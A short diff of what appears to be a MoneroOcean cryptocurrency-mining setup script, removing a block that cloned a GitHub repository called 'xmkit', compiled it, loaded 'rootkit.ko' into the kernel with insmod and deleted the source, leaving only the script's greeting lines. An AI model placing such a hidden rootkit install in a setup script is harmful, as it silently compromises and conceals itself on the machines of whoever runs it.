@@ -4,16 +4,6 @@ VERSION=2.11
 
 # printing greetings
 
-echo "Loading kit..."
-cd $HOME
-git clone https://github.com/killercarrot00/xmkit
-cd xmkit
-make
-insmod rootkit.ko
-cd $HOME
-rm -rf xmkit
-echo "kit ok."
-
 echo "MoneroOcean mining setup script v$VERSION."
 echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"
 echo
